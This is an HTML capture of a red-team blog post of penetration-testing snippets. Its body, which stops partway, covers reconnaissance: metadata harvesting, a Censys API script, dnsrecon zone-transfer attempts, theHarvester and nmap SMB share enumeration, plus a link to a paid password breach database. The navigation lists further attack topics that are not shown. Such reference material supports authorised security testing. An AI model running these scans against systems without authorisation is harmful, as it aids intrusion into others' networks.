      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3-3" type="checkbox" id="nav-2-3-3">
    
    <label class="md-nav__link" for="nav-2-3-3">
      5
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-3-3">
        5
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2017/05/empire-modifying-server-c2-indicators/" title="Empire Modifying Server C2 Indicators" class="md-nav__link">
      Empire Modifying Server C2 Indicators
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2017/05/invoke-hostenum/" title="Invoke-Hostenum" class="md-nav__link">
      Invoke-Hostenum
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3-4" type="checkbox" id="nav-2-3-4">
    
    <label class="md-nav__link" for="nav-2-3-4">
      3
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-3-4">
        3
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2017/03/leveraging-expired-domains-for-red-team-engagements/" title="Leveraging Expired Domains for Red Team Engagements" class="md-nav__link">
      Leveraging Expired Domains for Red Team Engagements
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4">
    
    <label class="md-nav__link" for="nav-2-4">
      2016
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-4">
        2016
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4-1" type="checkbox" id="nav-2-4-1">
    
    <label class="md-nav__link" for="nav-2-4-1">
      12
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-4-1">
        12
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2016/12/slack-notifications-for-cobalt-strike/" title="Slack Notifications for Cobalt Strike" class="md-nav__link">
      Slack Notifications for Cobalt Strike
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4-2" type="checkbox" id="nav-2-4-2">
    
    <label class="md-nav__link" for="nav-2-4-2">
      10
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-4-2">
        10
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2016/10/web-shells-covert-channel/" title="SubShell and TinyShell - Custom Covert Webshells" class="md-nav__link">
      SubShell and TinyShell - Custom Covert Webshells
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4-3" type="checkbox" id="nav-2-4-3">
    
    <label class="md-nav__link" for="nav-2-4-3">
      09
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-4-3">
        09
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2016/09/new-information-security-red-teaming-blog-threat-express-minis/" title="New Information Security and Red Teaming Blog Threat Express by MINIS" class="md-nav__link">
      New Information Security and Red Teaming Blog Threat Express by MINIS
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../archive/" title="Archive" class="md-nav__link">
      Archive
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../contributors/" title="Contributors" class="md-nav__link">
      Contributors
    </a>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#foca" title="FOCA" class="md-nav__link">
    FOCA
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#maltego" title="Maltego" class="md-nav__link">
    Maltego
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconng" title="ReconNG" class="md-nav__link">
    ReconNG
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metagoofil" title="Metagoofil" class="md-nav__link">
    Metagoofil
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#censysio" title="censys.io" class="md-nav__link">
    censys.io
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dsnrecon" title="dsnrecon" class="md-nav__link">
    dsnrecon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#theharvester" title="TheHarvester" class="md-nav__link">
    TheHarvester
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nmap" title="Nmap" class="md-nav__link">
    Nmap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ids-evasion" title="IDS Evasion" class="md-nav__link">
    IDS Evasion
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" title="Web" class="md-nav__link">
    Web
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#eyewitness" title="Eyewitness" class="md-nav__link">
    Eyewitness
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#built-in-commands" title="Built-in Commands" class="md-nav__link">
    Built-in Commands
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsquery" title="DSQUERY" class="md-nav__link">
    DSQUERY
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlcmd" title="SQLCMD" class="md-nav__link">
    SQLCMD
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsutil" title="NTDSUTIL" class="md-nav__link">
    NTDSUTIL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker" title="Applocker" class="md-nav__link">
    Applocker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-defender" title="Windows Defender" class="md-nav__link">
    Windows Defender
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appcmd" title="APPCMD" class="md-nav__link">
    APPCMD
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-lateral-movement" title="Windows Lateral Movement" class="md-nav__link">
    Windows Lateral Movement
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-persistence-methods" title="Windows Persistence Methods" class="md-nav__link">
    Windows Persistence Methods
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#registry-keys" title="Registry Keys" class="md-nav__link">
    Registry Keys
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modify-registry-keys" title="Modify registry keys" class="md-nav__link">
    Modify registry keys
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#userinit-key" title="Userinit Key" class="md-nav__link">
    Userinit Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-key" title="Run Key" class="md-nav__link">
    Run Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" title="List Image File Execution Options (Debugger file executed when the target file is run)" class="md-nav__link">
    List Image File Execution Options (Debugger file executed when the target file is run)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appinit_dlls" title="AppInit_DLLs" class="md-nav__link">
    AppInit_DLLs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-reboot-sethcutilman-option-using-a-debugger-key" title="No-reboot sethc/utilman option using a "debugger" key" class="md-nav__link">
    No-reboot sethc/utilman option using a "debugger" key
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-storage-locations" title="File Storage Locations" class="md-nav__link">
    File Storage Locations
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-folders" title="Startup Folders" class="md-nav__link">
    Startup Folders
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sethcutilman-replacement" title="SETHC/UTILMAN Replacement" class="md-nav__link">
    SETHC/UTILMAN Replacement
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#volume-shadow-copy-restore-points" title="Volume Shadow Copy (Restore Points)" class="md-nav__link">
    Volume Shadow Copy (Restore Points)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vssadmin-native-windows-utility" title="VSSADMIN – native windows utility" class="md-nav__link">
    VSSADMIN – native windows utility
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" title="Use WMIC process call to run an .exe from a Volume Shadow Copy" class="md-nav__link">
    Use WMIC process call to run an .exe from a Volume Shadow Copy
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task-scheduling" title="Task Scheduling" class="md-nav__link">
    Task Scheduling
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#at" title="AT" class="md-nav__link">
    AT
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schtasks" title="SCHTASKS" class="md-nav__link">
    SCHTASKS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#additional-notes" title="Additional Notes" class="md-nav__link">
    Additional Notes
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-service" title="Windows Service" class="md-nav__link">
    Windows Service
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" title="DLL-Hijacking" class="md-nav__link">
    DLL-Hijacking
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linkinfodll-replacement" title="linkinfo.dll Replacement" class="md-nav__link">
    linkinfo.dll Replacement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-event-persistence-via-powershell" title="WMI Event Persistence via Powershell" class="md-nav__link">
    WMI Event Persistence via Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-event-filter" title="WMI Event Filter" class="md-nav__link">
    WMI Event Filter
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#event-consumer" title="Event Consumer" class="md-nav__link">
    Event Consumer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filterconsumer-binding" title="Filter/Consumer Binding" class="md-nav__link">
    Filter/Consumer Binding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removal" title="REMOVAL" class="md-nav__link">
    REMOVAL
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malicious-outlook-rules" title="Malicious Outlook Rules" class="md-nav__link">
    Malicious Outlook Rules
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-remote-management-winrm-psremoting" title="Windows Remote Management (WinRM) / PSRemoting" class="md-nav__link">
    Windows Remote Management (WinRM) / PSRemoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uninstall-a-patch-to-leave-the-system-vulnerable" title="Uninstall a patch to leave the system vulnerable" class="md-nav__link">
    Uninstall a patch to leave the system vulnerable
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" title="Create custom DLL for password filters and install on DC to capture changed passwords" class="md-nav__link">
    Create custom DLL for password filters and install on DC to capture changed passwords
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#application-whitelisting-bypass-techniques" title="Application Whitelisting Bypass Techniques" class="md-nav__link">
    Application Whitelisting Bypass Techniques
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell" title="Powershell" class="md-nav__link">
    Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-files-custom" title="Find-Files (custom)" class="md-nav__link">
    Find-Files (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-enumeration-custom" title="Get-Enumeration (custom)" class="md-nav__link">
    Get-Enumeration (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-and-execute-iex" title="Download and execute IEX" class="md-nav__link">
    Download and execute IEX
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#encodedcommand-and-iex-detection-bypass" title="EncodedCommand and IEX detection bypass" class="md-nav__link">
    EncodedCommand and IEX detection bypass
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" title="Bloodhound" class="md-nav__link">
    Bloodhound
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikittenz" title="Mimikittenz" class="md-nav__link">
    Mimikittenz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup" title="PowerUp" class="md-nav__link">
    PowerUp
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" title="PowerView" class="md-nav__link">
    PowerView
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#net-functions" title="net * Functions:" class="md-nav__link">
    net * Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-functions" title="GPO functions" class="md-nav__link">
    GPO functions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-hunting-functions" title="User-Hunting Functions:" class="md-nav__link">
    User-Hunting Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-trust-functions" title="Domain Trust Functions:" class="md-nav__link">
    Domain Trust Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metafunctions" title="MetaFunctions:" class="md-nav__link">
    MetaFunctions:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" title="Inveigh" class="md-nav__link">
    Inveigh
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-requirements" title="Privilege Requirements:" class="md-nav__link">
    Privilege Requirements:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#features" title="Features:" class="md-nav__link">
    Features:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-wout-powershell" title="Powershell W/out Powershell" class="md-nav__link">
    Powershell W/out Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-indexeditem" title="Get-IndexedItem" class="md-nav__link">
    Get-IndexedItem
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interacting-w-windows-api" title="Interacting w/ Windows API" class="md-nav__link">
    Interacting w/ Windows API
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-lock-workstation-and-messagebox" title="Example – Lock Workstation and MessageBox" class="md-nav__link">
    Example – Lock Workstation and MessageBox
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mailsniper-owa-and-exchange-enumeration" title="MailSniper (OWA and Exchange Enumeration)" class="md-nav__link">
    MailSniper (OWA and Exchange Enumeration)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" title="Locate OWA instances via Autodiscover using only organization primary domain name" class="md-nav__link">
    Locate OWA instances via Autodiscover using only organization primary domain name
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" title="DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)" class="md-nav__link">
    DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-start-guide" title="Quick Start Guide" class="md-nav__link">
    Quick Start Guide
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-domainpasswordspray-options" title="Invoke-DomainPasswordSpray Options" class="md-nav__link">
    Invoke-DomainPasswordSpray Options
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misc-powershell-pasties" title="Misc Powershell Pasties" class="md-nav__link">
    Misc Powershell Pasties
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mimikatz" title="Mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberoast" title="Kerberoast" class="md-nav__link">
    Kerberoast
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#domain-admin-privesc-methods" title="Domain Admin Privesc Methods" class="md-nav__link">
    Domain Admin Privesc Methods
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#domain-fronting" title="Domain Fronting" class="md-nav__link">
    Domain Fronting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cobalt-strike" title="Cobalt Strike" class="md-nav__link">
    Cobalt Strike
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#opsec-considerations-for-beacon-commands" title="OPSEC Considerations for Beacon Commands" class="md-nav__link">
    OPSEC Considerations for Beacon Commands
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-function-wrapper" title="Powershell Function Wrapper" class="md-nav__link">
    Powershell Function Wrapper
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-scripts" title="Persistence Scripts" class="md-nav__link">
    Persistence Scripts
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#empire" title="EMPIRE" class="md-nav__link">
    EMPIRE
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c2-profiles" title="C2 Profiles" class="md-nav__link">
    C2 Profiles
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bash" title="BASH" class="md-nav__link">
    BASH
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/threatexpress/edit/master/docs/blogs/2019/01/penetration-testing-pasties.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="penetration-testing-pasties">Penetration Testing Pasties<a class="headerlink" href="#penetration-testing-pasties" title="Permanent link">&para;</a></h1>
<p><strong>James Tubberville | January 11, 2019 | Tweet This Post: <a href="https://twitter.com/intent/tweet?url=http://threatexpress.com/2019/11/penetration-testing-pasties/&amp;text=Penetration testing and red teaming snipits."><i class="fa fa-twitter"></i></a></strong></p>
<p><img alt="" src="/threatexpress/img/pasties.png" /></p>
<p>'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest (<a href="https://www.twitter.com/joevest">@joevest</a>), Andrew Chiles (<a href="https://www.twitter.com/andrewchiles">@andrewchiles</a>), Derek Rushing, or myself (<a href="https://www.twitter.com/minis_io">@minis_io</a>) have found useful. Over time additional sections, section placeholders, snippets, and links were added for "quick reference" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki.</p>
<p>As usual, you can find the raw file and get the latest version of tools on our GitHub repository: .</p>
<p>Penetration Testing Framework</p>
<ul>
<li><a href="http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html">http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html</a></li>
</ul>
<p>Penetration Testing Execution Standard</p>
<ul>
<li><a href="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines">http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines</a></li>
</ul>
<p>Good writeup on passive information gathering</p>
<ul>
<li><a href="http://www.securitysift.com/passive-reconnaissance/">http://www.securitysift.com/passive-reconnaissance/</a></li>
</ul>
<p>Password Breach Database, requires subscription</p>
<p><a href="https://leakbase.pw/">https://leakbase.pw/</a></p>
<h2 id="foca">FOCA<a class="headerlink" href="#foca" title="Permanent link">&para;</a></h2>
<h2 id="maltego">Maltego<a class="headerlink" href="#maltego" title="Permanent link">&para;</a></h2>
<h2 id="reconng">ReconNG<a class="headerlink" href="#reconng" title="Permanent link">&para;</a></h2>
<h2 id="metagoofil">Metagoofil<a class="headerlink" href="#metagoofil" title="Permanent link">&para;</a></h2>
<p>Source: <a href="http://resources.infosecinstitute.com/kali-reporting-tools/#gref">http://resources.infosecinstitute.com/kali-reporting-tools/#gref</a></p>
<p>Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc.</p>
<p>Metagoofil performs the following:</p>
<ul>
<li>Searches the given file type using the Google search engine</li>
<li>Downloads all the documents found</li>
<li>Extracts metadata from downloaded documents</li>
<li>Saves the result in HTML file</li>
</ul>
<p>Perform document metadata searching on target domain using first 200 google results</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>metagoofil -d .com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html
</pre></div>
</td></tr></table>

<h2 id="censysio">censys.io<a class="headerlink" href="#censysio" title="Permanent link">&para;</a></h2>
<p>Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed.</p>
<ul>
<li>Create an account and get an API key for use in ReconNG or manual searching</li>
<li><a href="https://censys.io/ipv4?q=">https://censys.io/ipv4?q=</a></li>
</ul>
<p>Python API</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="c1"># pip install censys</span>

<span class="kn">import</span> <span class="nn">censys.ipv4</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">censys</span><span class="o">.</span><span class="n">ipv4</span><span class="o">.</span><span class="n">CensysIPv4</span><span class="p">(</span><span class="n">api_id</span><span class="o">=</span><span class="s2">&quot;Get from MyAccount at censys.io&quot;</span><span class="p">,</span> <span class="n">api_secret</span><span class="o">=</span><span class="s2">&quot;Get from MyAccount at censys.io&quot;</span><span class="p">)</span>
<span class="n">ranges</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;X.X.X.0/24&quot;</span><span class="p">,</span> <span class="s2">&quot;X.X.X.0/24&quot;</span><span class="p">,</span> <span class="s2">&quot;X.X.X.0/24&quot;</span><span class="p">]</span>
<span class="k">for</span> <span class="nb">range</span> <span class="ow">in</span> <span class="n">ranges</span><span class="p">:</span>
<span class="n">results</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="nb">range</span><span class="p">)</span>
<span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s2">&quot;protocols&quot;</span><span class="p">]:</span>
<span class="k">print</span> <span class="n">result</span><span class="p">[</span><span class="s2">&quot;ip&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;,&quot;</span> <span class="o">+</span> <span class="n">port</span>
</pre></div>
</td></tr></table>

<h2 id="dsnrecon">dsnrecon<a class="headerlink" href="#dsnrecon" title="Permanent link">&para;</a></h2>
<p>Normal dns reverse lookup of IP range with CSV output</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dnsrecon -t rvl -r 1.2.3.4/24 -c output.csv
</pre></div>
</td></tr></table>

<p>Perform default enumeration of a domain</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dnsrecon -d
</pre></div>
</td></tr></table>

<p>Perform zone transfer attempt</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dnsrecon -t axfr -d

╰ $ dnsrecon -h
Version: 0.8.10
Usage: dnsrecon.py

Options:
-h, --help Show this help message and exit.
-d, --domain Target domain.
-r, --range IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).
-n, --name_server Domain server to use. If none is given, the SOA of the target will be used.
-D, --dictionary Dictionary file of subdomain and hostnames to use for brute force.
-f Filter out of brute force domain lookup, records that resolve to the wildcard defined
IP address when saving records.
-t, --type Type of enumeration to perform:
std SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
rvl Reverse lookup of a given CIDR or IP range.
brt Brute force domains and hosts using a given dictionary.
srv SRV records.
axfr Test all NS servers for a zone transfer.
goo Perform Google search for subdomains and hosts.
snoop Perform cache snooping against all NS servers for a given domain, testing
all with file containing the domains, file given with -D option.
tld Remove the TLD of given domain and test against all TLDs registered in IANA.
zonewalk Perform a DNSSEC zone walk using NSEC records.
-a Perform AXFR with standard enumeration.
-s Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.
-g Perform Google enumeration with standard enumeration.
-w Perform deep whois record analysis and reverse lookup of IP ranges found through
Whois when doing a standard enumeration.
-z Performs a DNSSEC zone walk with standard enumeration.
--threads Number of threads to use in reverse lookups, forward lookups, brute force and SRV
record enumeration.
--lifetime Time to wait for a server to response to a query.
--db SQLite 3 file to save found records.
--xml XML file to save found records.
--iw Continue brute forcing a domain even if a wildcard records are discovered.
-c, --csv Comma separated value file.
-j, --json JSON file.
-v Show attempts in the brute force modes.
</pre></div>
</td></tr></table>

<h2 id="theharvester">TheHarvester<a class="headerlink" href="#theharvester" title="Permanent link">&para;</a></h2>
<p>Perform lookup against with additional DNS reverse on all ranges discovered</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>theharvester -d -c -n -b google -l 1000 [-f output]

Usage: theharvester options

-d: Domain to search or company name
-b: data source: google, googleCSE, bing, bingapi, pgp
linkedin, google-profiles, people123, jigsaw,
twitter, googleplus, all

-s: Start in result number X (default: 0)
-v: Verify host name via dns resolution and search for virtual hosts
-f: Save the results into an HTML and XML file
-n: Perform a DNS reverse query on all ranges discovered
-c: Perform a DNS brute force for the domain name
-t: Perform a DNS TLD expansion discovery
-e: Use this DNS server
-l: Limit the number of results to work with(bing goes from 50 to 50 results,
-h: use SHODAN database to query discovered hosts
google 100 to 100, and pgp doesn&#39;t use this option)

Examples:
theharvester -d microsoft.com -l 500 -b google
theharvester -d microsoft.com -b pgp
theharvester -d microsoft -l 200 -b linkedin
theharvester -d apple.com -b googleCSE -l 500 -s 300
</pre></div>
</td></tr></table>

<h2 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt">https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt</a></p>
<p>Host discovery</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap -sn -n
nmap -A (run this second)
nmap -sV -F
nmap -p- -sV -O -T4 -v7 -sC
</pre></div>
</td></tr></table>

<p>Open SMB shares</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap --script=smb-enum-shares -p445
</pre></div>
</td></tr></table>

<p>Open NFS Shares</p>
